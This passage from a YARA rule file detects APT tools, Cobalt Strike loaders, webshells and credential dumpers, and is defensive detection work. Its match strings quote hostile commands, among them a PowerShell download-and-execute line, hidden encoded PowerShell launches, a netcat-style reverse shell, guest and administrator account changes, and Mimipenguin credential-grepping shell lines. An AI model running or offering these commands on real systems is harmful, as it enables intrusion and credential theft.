\"c41e97b3b22a3f0264f10af2e71e3db44e53c6633d0d690ac4d2f8f5005708ed\"\n      hash2 = \"b93b5d6716a4f8eee450d9f374d0294d1800784bc99c6934246570e4baffe509\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      required_modules = \"pe\"\n      minimum_yara = \"3.0.0\"\n      \n   strings:\n      $s1 = \"Injector.dll\" fullword ascii\n      $s2 = \"ReflectiveLoader\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and all of them ) or ( pe.exports ( \"__dec\" ) and pe.exports ( \"_check\" ) and pe.exports ( \"_dec\" ) and pe.exports ( \"start\" ) and pe.exports ( \"test\" ) )\n}\n\nrule WiltedTulip_Zpp_RID2D21 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects hack tool used in Operation Wilted Tulip\"\n      author = \"Florian Roth\"\n      reference = \"http://www.clearskysec.com/tulip\"\n      date = \"2017-07-23 10:18:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2022-12-21\"\n      hash1 = \"10ec585dc1304436821a11e35473c0710e844ba18727b302c6bd7f8ebac574bb\"\n      hash2 = \"7d046a3ed15035ea197235980a72d133863c372cc27545af652e1b2389c23918\"\n      hash3 = \"6d6816e0b9c24e904bc7c5fea5951d53465c478cc159ab900d975baf8a0921cf\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"[ERROR] Error Main -i -s -d -gt -lt -mb\" fullword wide\n      $x2 = \"[ERROR] Error Main -i(with.) -s -d -gt -lt -mb -o -e\" fullword wide\n      $s1 = \"LT Time invalid\" fullword wide\n      $s2 = \"doCompressInNetWorkDirectory\" fullword ascii\n      $s3 = \"files remaining ,total file save = \" fullword wide\n      $s4 = \"$ec996350-79a4-477b-87ae-2d5b9dbe20fd\" fullword ascii\n      $s5 = \"Destinition Directory Not Found\" fullword wide\n      $s6 = \"\\\\obj\\\\Release\\\\ZPP.pdb\" ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 30KB and ( 1 of ( $x* ) or 3 of them )\n}\n\nrule WiltedTulip_Netsrv_netsrvs_RID31DD : APT DEMO EXE FILE T1218_011 {\n   meta:\n      description = \"Detects sample from Operation Wilted Tulip\"\n      author = \"Florian Roth\"\n      reference = \"http://www.clearskysec.com/tulip\"\n      date = \"2017-07-23 13:40:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"a062cb4364125427b54375d51e9e9afb0baeb09b05a600937f70c9d6d365f4e5\"\n      hash2 = \"afa563221aac89f96c383f9f9f4ef81d82c69419f124a80b7f4a8c437d83ce77\"\n      hash3 = \"acf24620e544f79e55fd8ae6022e040257b60b33cf474c37f2877c39fbf2308a\"\n      tags = \"APT, DEMO, EXE, FILE, T1218_011\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Process %d Created\" fullword ascii\n      $s2 = \"%s\\\\system32\\\\rundll32.exe\" fullword wide\n      $s3 = \"%s\\\\SysWOW64\\\\rundll32.exe\" fullword wide\n      $c1 = \"slbhttps\" fullword ascii\n      $c2 = \"/slbhttps\" fullword wide\n      $c3 = \"/slbdnsk1\" fullword wide\n      $c4 = \"netsrv\" fullword wide\n      $c5 = \"/slbhttps\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and ( all of ( $s* ) and 1 of ( $c* ) ) )\n}\n\nrule CobaltStrike_ReflectiveLoader_RID3297 : APT COBALTSTRIKE DEMO EXE FILE S0154 T1105 T1550_002 {\n   meta:\n      description = \"Detects reflective loader (Cobalt Strike)\"\n      author = \"Florian Roth\"\n      reference = \"http://www.clearskysec.com/tulip\"\n      date = \"2017-07-23 14:11:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"1097bf8f5b832b54c81c1708327a54a88ca09f7bdab4571f1a335cc26bbd7904\"\n      hash2 = \"1f52d643e8e633026db73db55eb1848580de00a203ee46263418f02c6bdb8c7a\"\n      hash3 = \"a159a9bfb938de686f6aced37a2f7fa62d6ff5e702586448884b70804882b32f\"\n      tags = \"APT, COBALTSTRIKE, DEMO, EXE, FILE, S0154, T1105, T1550_002\"\n      required_modules = \"pe\"\n      minimum_yara = \"3.0.0\"\n      \n   strings:\n      $x1 = \"powershell -nop -exec bypass -EncodedCommand \\\"%s\\\"\" fullword ascii\n      $x2 = \"%d is an x86 process (can't inject x64 content)\" fullword ascii\n      $x3 = \"IEX (New-Object Net.Webclient).DownloadString('http://127.0.0.1:%u/'); %s\" fullword ascii\n      $x4 = \"Failed to impersonate token from %d (%u)\" fullword ascii\n      $x5 = \"Failed to impersonate logged on user %d (%u)\" fullword ascii\n      $x6 = \"%s.4%08x%08x%08x%08x%08x.%08x%08x%08x%08x%08x%08x%08x.%08x%08x%08x%08x%08x%08x%08x.%08x%08x%08x%08x%08x%08x%08x.%x%x.%s\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 600KB and 1 of them ) or ( 2 of them ) or pe.exports ( \"_ReflectiveLoader@4\" )\n}\n\nrule WiltedTulip_Matryoshka_RAT_RID3150 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects Matryoshka RAT used in Operation Wilted Tulip\"\n      author = \"Florian Roth\"\n      reference = \"http://www.clearskysec.com/tulip\"\n      date = \"2017-07-23 13:17:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"6f208473df0d31987a4999eeea04d24b069fdb6a8245150aa91dfdc063cd64ab\"\n      hash2 = \"6cc1f4ecd28b833c978c8e21a20a002459b4a6c21a4fbaad637111aa9d5b1a32\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"%S:\\\\Users\\\\public\" fullword wide\n      $s2 = \"ntuser.dat.swp\" fullword wide\n      $s3 = \"Job Save / Load Config\" fullword wide\n      $s4 = \".?AVPSCL_CLASS_JOB_SAVE_CONFIG@@\" fullword ascii\n      $s5 = \"winupdate64.com\" fullword ascii\n      $s6 = \"Job Save KeyLogger\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and 3 of them )\n}\n\nrule Kekeo_Hacktool_RID2C94 : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Detects Kekeo Hacktool\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/gentilkiwi/kekeo/releases\"\n      date = \"2017-07-21 09:55:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"ce92c0bcdf63347d84824a02b7a448cf49dd9f44db2d02722d01c72556a2b767\"\n      hash2 = \"49d7fec5feff20b3b57b26faccd50bc05c71f1dddf5800eb4abaca14b83bba8c\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"[ticket %u] session Key is NULL, maybe a TGT without enough rights when WCE dumped it.\" fullword wide\n      $x2 = \"ERROR kuhl_m_smb_time ; Invalid! Command: %02x - Status: %08x\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and ( 1 of ( $x* ) ) )\n}\n\nrule Exp_EPS_CVE20152545_RID2C5A : DEMO EXPLOIT FILE OFFICE {\n   meta:\n      description = \"Detects EPS Word Exploit\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research - ME\"\n      date = \"2017-07-19 09:45:31\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXPLOIT, FILE, OFFICE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"word/media/image1.eps\" ascii\n      $s2 = \"-la;7(la+\" ascii\n   condition: \n      uint16 ( 0 ) == 0x4b50 and ( $s1 and #s2 > 20 )\n}\n\nrule JS_Suspicious_Obfuscation_Dropbox_RID345D : DEMO OBFUS SCRIPT T1059 T1059_001 {\n   meta:\n      description = \"Detects PowerShell AMSI Bypass\"\n      author = \"Florian Roth\"\n      reference = \"https://twitter.com/ItsReallyNick/status/887705105239343104\"\n      date = \"2017-07-19 15:27:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, OBFUS, SCRIPT, T1059, T1059_001\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"j\\\"+\\\"a\\\"+\\\"v\\\"+\\\"a\\\"+\\\"s\\\"+\\\"c\\\"+\\\"r\\\"+\\\"i\\\"+\\\"p\\\"+\\\"t\\\"\" \n      $x2 = \"script:https://www.dropbox.com\" ascii\n   condition: \n      2 of them\n}\n\nrule JS_Suspicious_MSHTA_Bypass_RID30F1 : DEMO SCRIPT T1059 T1218_005 {\n   meta:\n      description = \"Detects MSHTA Bypass\"\n      author = \"Florian Roth\"\n      reference = \"https://twitter.com/ItsReallyNick/status/887705105239343104\"\n      date = \"2017-07-19 13:01:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1059, T1218_005\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"mshtml,RunHTMLApplication\" ascii\n      $s2 = \"new ActiveXObject(\\\"WScript.Shell\\\").Run(\" ascii\n      $s3 = \"/c start mshta j\" ascii nocase\n   condition: \n      2 of them\n}\n\nrule Unspecified_Malware_Jul17_2C_RID316E : CHINA DEMO EXE FILE MAL T1047 {\n   meta:\n      description = \"Unspecified Malware - CN relation\"\n      author = \"Florian Roth\"\n      reference = \"https://www.virustotal.com/gui/file/e8156ec1706716cada6f57b6b8ccc9fb0eb5debe906ac45bdc2b26099695b8f5/detection\"\n      date = \"2017-07-18 13:22:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      hash1 = \"e8156ec1706716cada6f57b6b8ccc9fb0eb5debe906ac45bdc2b26099695b8f5\"\n      tags = \"CHINA, DEMO, EXE, FILE, MAL, T1047\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"%AllUsersProfile%\\\\DeviceSync\\\\m.exe\" fullword wide\n      $x2 = \"freenow.chickenkiller.com\" fullword ascii\n      $x3 = \"\\\\Release\\\\PhantomNet-SSL.pdb\" ascii\n      $s1 = \"SELECT * FROM AntiVirusProduct\" fullword ascii\n      $s2 = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/%08X-%04X-%04X-%02X%02X%02X%02X\" fullword ascii\n      $s3 = \"Proxy-Authenticate: Basic\" fullword ascii\n      $s4 = \"Proxy-Authenticate: NTLM\" fullword ascii\n      $s5 = \"Root\\\\SecurityCenter2\" fullword wide\n      $s6 = \"aaabbbcccddd\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 400KB and ( 1 of ( $x* ) or 4 of ( $s* ) ) ) or ( all of them )\n}\n\nrule POSHSPY_Malware_RID2C6F : DEMO MAL {\n   meta:\n      description = \"Detects POSHSPY malware\"\n      author = \"Florian Roth\"\n      reference = \"https://www.fireeye.com/blog/threat-research/2017/03/dissecting_one_ofap.html\"\n      date = \"2017-07-15 09:49:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-01-25\"\n      tags = \"DEMO, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"function sWP($cN, $pN, $aK, $aI)\" fullword ascii\n      $x2 = \"$aeK = [byte[]] (0x69, 0x87, 0x0b, 0xf2\" ascii\n      $x3 = \"(('variant', 'excretions', 'accumulators', 'winslow', 'whistleable', 'len',\" \n      $x4 = \"$cPairKey = \\\"BwIAAACkAABSU0EyAAQAAAEAA\" \n      $x5 = \"$exeRes = exePldRoutine\" \n      $x6 = \"ZgB1AG4AYwB0AGkAbwBuACAAcAB1AHIAZgBDAHIA\" \n   condition: \n      1 of them\n}\n\nrule CHAOS_Payload_RID2BA8 : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Detects a CHAOS back connect payload\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/tiagorlampert/CHAOS\"\n      date = \"2017-07-15 09:15:51\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"0962fcfcb1b52df148720c2112b036e75755f09279e3ebfce1636739af9b4448\"\n      hash2 = \"5c3553345f824b7b6de09ccb67d834e428b8df17443d98816471ca28f5a11424\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = { 2F 43 48 41 4F 53 00 02 73 79 6E 63 2F 61 74 6F 6D 69 63 } \n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 15000KB and all of them )\n}\n\nrule SecurityXploded_Producer_String_RID33B2 : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Detects hacktools by SecurityXploded\"\n      author = \"Florian Roth\"\n      reference = \"http://securityxploded.com/browser-password-dump.php\"\n      date = \"2017-07-13 14:58:51\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"d57847db5458acabc87daee6f30173348ac5956eb25e6b845636e25f5a56ac59\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"http://securityxploded.com\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and all of them )\n}\n\nrule PAS_Webshell_Encoded_RID2E9B : DEMO FILE T1505_003 WEBSHELL {\n   meta:\n      description = \"Detects a PAS webshell\"\n      author = \"Florian Roth\"\n      reference = \"http://blog.talosintelligence.com/2017/07/the-medoc-connection.html\"\n      date = \"2017-07-11 11:21:41\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, FILE, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $head1 = \"<?php $____=\" fullword ascii\n      $head2 = \"'base'.(32*2).'\" \n      $enc1 = \"isset($_COOKIE['___']\" ascii\n      $enc2 = \"if($___!==NULL){\" ascii\n      $enc3 = \").substr(md5(strrev($\" ascii\n      $enc4 = \"]))%256);$\" ascii\n      $enc5 = \"]))@setcookie('\" ascii\n      $enc6 = \"]=chr(( ord($_\" ascii\n      $x1 = { 3D 0A 27 29 29 3B 69 66 28 69 73 73 65 74 28 24 5F 43 4F 4F 4B 49 45 5B 27 } \n      $foot1 = \"value=\\\"\\\"/><input type=\\\"submit\\\" value=\\\"&gt;\\\"/></form>\" \n      $foot2 = \"();}} @header(\\\"Status: 404 Not Found\\\"); ?>\" \n   condition: \n      ( uint32 ( 0 ) == 0x68703f3c and filesize < 80KB and ( 3 of them or $head1 at 0 or $head2 in ( 0 .. 20 ) or 1 of ( $x* ) ) ) or $foot1 at ( filesize - 52 ) or $foot2 at ( filesize - 44 )\n}\n\nrule WinPayloads_PowerShell_RID2FE0 : DEMO HKTL SCRIPT T1059_001 {\n   meta:\n      description = \"Detects WinPayloads PowerShell Payload\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/nccgroup/Winpayloads\"\n      date = \"2017-07-11 12:15:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"011eba8f18b66634f6eb47527b4ceddac2ae615d6861f89a35dbb9fc591cae8e\"\n      tags = \"DEMO, HKTL, SCRIPT, T1059_001\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"$Base64Cert = 'MIIJeQIBAzCCCT8GCSqGSIb3DQEHAaCCCTAEggksMIIJKDCCA98GCSqGSIb3DQEHBqCCA9AwggPMAgEAMIIDxQYJKoZIhvcNAQcBMBwGCiqGSIb3D\" ascii\n      $x2 = \"powershell -w hidden -noni -enc SQBF\" fullword ascii nocase\n      $x3 = \"SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAGMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwA\" ascii\n      $x4 = \"powershell.exe -WindowStyle Hidden -enc JABjAGwAaQBlAG4AdAA\" ascii\n   condition: \n      filesize < 10KB and 1 of them\n}\n\nrule WinPayloads_Payload_RID2EA5 : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Detects WinPayloads Payload\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/nccgroup/Winpayloads\"\n      date = \"2017-07-11 11:23:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"23a24f99c3c6c00cd4bf6cb968f813ba2ceadfa846c7f169f412bcbb71ba6573\"\n      hash2 = \"35069905d9b7ba1fd57c8df03614f563504194e4684f47aafa08ebb8d9409d0b\"\n      hash3 = \"a28d107f168d85c38fc76229b14561b472e60e60973eb10b6b554c1f57469322\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"bpayload.exe.manifest\" fullword ascii\n      $s2 = \"spayload\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 10000KB and all of them )\n}\n\nrule ZxShell_Related_Malware_CN_Group_Jul17_1_RID3601 : APT CHINA DEMO EXE FILE T1087_002 T1543_003 {\n   meta:\n      description = \"Detects a ZxShell related sample from a CN threat group\"\n      author = \"Florian Roth\"\n      reference = \"https://blogs.rsa.com/cat-phishing/\"\n      date = \"2017-07-08 16:37:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"ef56c2609bc1b90f3e04745890235e6052a4be94e35e38b6f69b64fb17a7064e\"\n      tags = \"APT, CHINA, DEMO, EXE, FILE, T1087_002, T1543_003\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"CMD.EXE /C NET USER GUEST /ACTIVE:yes && NET USER GUEST ++++++\" ascii\n      $x2 = \"system\\\\cURRENTcONTROLSET\\\\sERVICES\\\\tERMSERVICE\" fullword ascii\n      $x3 = \"\\\\secivreS\\\\teSlortnoCtnerruC\\\\METSYS\" ascii\n      $x4 = \"system\\\\cURRENTCONTROLSET\\\\cONTROL\\\\tERMINAL sERVER\" fullword ascii\n      $x5 = \"sOFTWARE\\\\mICROSOFT\\\\iNTERNET eXPLORER\\\\mAIN\" fullword ascii\n      $x6 = \"eNABLEaDMINtsREMOTE\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 400KB and 1 of them )\n}\n\nrule ZxShell_Related_Malware_CN_Group_Jul17_2_RID3602 : APT CHINA DEMO EXE FILE T1021_002 {\n   meta:\n      description = \"Detects a ZxShell related sample from a CN threat group\"\n      author = \"Florian Roth\"\n      reference = \"https://blogs.rsa.com/cat-phishing/\"\n      date = \"2017-07-08 16:37:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"204273675526649b7243ee48efbb7e2bc05239f7f9015fbc4fb65f0ada64759e\"\n      tags = \"APT, CHINA, DEMO, EXE, FILE, T1021_002\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $u1 = \"User-Agent:Mozilla/4.0 (compatible; MSIE %d.00; Windows NT %d.0; MyIE 3.01)\" fullword ascii\n      $u2 = \"User-Agent:Mozilla/4.0 (compatible; MSIE %d.0; Windows NT %d.1; SV1)\" fullword ascii\n      $u3 = \"User-Agent:Mozilla/5.0 (X11; U; Linux i686; en-US; re:1.4.0) Gecko/20080808 Firefox/%d.0\" fullword ascii\n      $u4 = \"User-Agent:Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)\" fullword ascii\n      $x1 = \"\\\\\\\\%s\\\\admin$\\\\g1fd.exe\" fullword ascii\n      $x2 = \"C:\\\\g1fd.exe\" fullword ascii\n      $x3 = \"\\\\\\\\%s\\\\C$\\\\NewArean.exe\" fullword ascii\n      $s0 = \"at \\\\\\\\%s %d:%d %s\" fullword ascii\n      $s1 = \"%c%c%c%c%ccn.exe\" fullword ascii\n      $s2 = \"hra%u.dll\" fullword ascii\n      $s3 = \"Referer: http://%s:80/http://%s\" fullword ascii\n      $s5 = \"Accept-Language: zh-cn\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and ( 1 of ( $x* ) or 3 of them )\n}\n\nrule ZxShell_Related_Malware_CN_Group_Jul17_3_RID3603 : APT CHINA DEMO EXE FILE {\n   meta:\n      description = \"Detects a ZxShell related sample from a CN threat group\"\n      author = \"Florian Roth\"\n      reference = \"https://blogs.rsa.com/cat-phishing/\"\n      date = \"2017-07-08 16:37:41\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"2e5cf8c785dc081e5c2b43a4a785713c0ae032c5f86ccbc7abf5c109b8854ed7\"\n      tags = \"APT, CHINA, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"%s\\\\nt%s.dll\" fullword ascii\n      $s2 = \"RegQueryValueEx(Svchost\\\\netsvcs)\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 600KB and all of them )\n}\n\nrule ZxShell_Jul17_RID2BCD : APT CHINA DEMO T1007 {\n   meta:\n      description = \"Detects a ZxShell - CN threat group\"\n      author = \"Florian Roth\"\n      reference = \"https://blogs.rsa.com/cat-phishing/\"\n      date = \"2017-07-08 09:22:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"5d2a4cde9fa7c2fdbf39b2e2ffd23378d0c50701a3095d1e91e3cf922d7b0b16\"\n      tags = \"APT, CHINA, DEMO, T1007\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"zxplug -add\" fullword ascii\n      $x2 = \"getxxx c:\\\\xyz.dll\" fullword ascii\n      $x3 = \"downfile -d c:\\\\windows\\\\update.exe\" fullword ascii\n      $x4 = \"-fromurl http://x.x.x/x.dll\" fullword ascii\n      $x5 = \"ping 127.0.0.1 -n 7&cmd.exe /c net start %s\" fullword ascii\n      $x6 = \"ZXNC -e cmd.exe x.x.x.x\" fullword ascii\n      $x7 = \"(bind a cmdshell)\" fullword ascii\n      $x8 = \"ZXFtpServer 21 20 zx\" fullword ascii\n      $x9 = \"ZXHttpServer\" fullword ascii\n      $x10 = \"c:\\\\error.htm,.exe|c:\\\\a.exe,.zip|c:\\\\b.zip\\\"\" fullword ascii\n      $x11 = \"c:\\\\windows\\\\clipboardlog.txt\" fullword ascii\n      $x12 = \"AntiSniff -a wireshark.exe\" fullword ascii\n      $x13 = \"c:\\\\windows\\\\keylog.txt\" fullword ascii\n   condition: \n      ( filesize < 10000KB and 1 of them ) or 3 of them\n}\n\nrule mimipenguin_1_RID2C43 : DEMO FILE HKTL {\n   meta:\n      description = \"Detects Mimipenguin hack tool\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/huntergregal/mimipenguin\"\n      date = \"2017-07-08 09:41:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"9e8d13fe27c93c7571075abf84a839fd1d31d8f2e3e48b3f4c6c13f7afcf8cbd\"\n      tags = \"DEMO, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"self._strings_dump += strings(dump_process(target_pid))\" fullword ascii\n      $x2 = \"def _dump_target_processes(self):\" fullword ascii\n      $x3 = \"self._target_processes = ['sshd:']\" fullword ascii\n      $x4 = \"GnomeKeyringPasswordFinder()\" ascii\n   condition: \n      ( uint16 ( 0 ) == 0x2123 and filesize < 20KB and 1 of them )\n}\n\nrule mimipenguin_2_RID2C44 : DEMO FILE HKTL {\n   meta:\n      description = \"Detects Mimipenguin hack tool\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/huntergregal/mimipenguin\"\n      date = \"2017-07-08 09:41:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"453bffa90d99a820e4235de95ec3f7cc750539e4023f98ffc8858f9b3c15d89a\"\n      tags = \"DEMO, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"DUMP=$(strings \\\"/tmp/dump.${pid}\\\" | grep -E\" fullword ascii\n      $x2 = \"strings /tmp/apache* | grep -E '^Authorization: Basic.+=$'\" fullword ascii\n      $x3 = \"grep -E '^_pammodutil_getpwnam_root_1$' -B 5 -A\" fullword ascii\n      $x4 = \"strings \\\"/tmp/dump.${pid}\\\" | grep -E -m 1 '^\\\\$.\\\\$.+\\\\$')\\\"\" fullword ascii\n      $x5 = \"if [[ -n $(ps -eo pid,command | grep -v 'grep' | grep gnome-keyring) ]]; then\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x2123 and filesize < 20KB and 1 of them )\n}\n\nrule Gen_Net_LocalGroup_Administrators_Add_Command_RID38C1 : DEMO EXE FILE GEN SUSP {\n   meta:\n      description = \"Detects an executable that contains a command to add a user account to the local administrators group\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2017-07-08 18:34:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE, GEN, SUSP\"\n      minimum_yara = \"2.2.0\"\n      \n   strings:\n      $x1 = /net localgroup administrators [a-zA-Z0-9]{1,16} \\/add/ nocase ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 400KB and 1 of them )\n}\n\nrule HDRoot_Sample_Jul17_1_RID2E84 : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects HDRoot samples\"\n      author = \"Florian Roth\"\n      reference = \"Winnti HDRoot VT\"\n      date = \"2017-07-07 11:17:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"6d2ad82f455becc8c830d000633a370857928c584246a7f41fe722cc46c0d113\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"gleupdate.dll\" fullword ascii\n      $s2 = \"\\\\DosDevices\\\\%ws\\\\system32\\\\%ws\" wide\n      $s3 = \"l\\\\Driver\\\\nsiproxy\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 60KB and 3 of them )\n}\n\nrule HDRoot_Sample_Jul17_2_RID2E85 : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects HDRoot samples\"\n      author = \"Florian Roth\"\n      reference = \"Winnti HDRoot VT\"\n      date = \"2017-07-07 11:18:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"1c302ed9786fc600073cc6f3ed2e50e7c23785c94a2908f74f92971d978b704b\"\n      hash2 = \"3b7cfa40e26fb6b079b55ec030aba244a6429e263a3d9832e32ab09e7a3c4a9c\"\n      hash3 = \"71eddf71a94c5fd04c9f3ff0ca1eb6b1770df1a3a8f29689fb8588427b5c9e8e\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"http://microsoftcompanywork.htm\" fullword ascii\n      $x2 = \"compose.aspx?s=%4X%4X%4X%4X%4X%4X\" fullword ascii\n      $t1 = \"http://babelfish.yahoo.com/translate_url?\" fullword ascii\n      $t2 = \"http://translate.google.com/translate?prev=hp&hl=en&js=n&u=%s?%d&sl=es&tl=en\" fullword ascii\n      $u1 = \"User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; SLCC1; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 3.5.\" ascii\n      $u2 = \"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Maxthon)\" fullword ascii\n      $u3 = \"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Maxthon; TERA:\" fullword ascii\n      $s1 = \"\\\\system32\\\\ntoskrnl.exe\" ascii\n      $s2 = \"Schedsvc.dll\" fullword wide\n      $s3 = \"dllserver64.dll\" fullword ascii\n      $s4 = \"C:\\\\TERA_SR.txt\" fullword ascii\n      $s5 = \"updatevnsc.dat\" fullword wide\n      $s6 = \"tera dll service global event\" fullword ascii\n      $s7 = \"Referer: http://%s/%s\" fullword ascii\n      $s8 = \"tera replace dll config\" fullword ascii\n      $s9 = \"SetupDll64.dll\" fullword ascii\n      $s10 = \"copy %%ComSpec%% \\\"%s\\\"\" fullword ascii\n   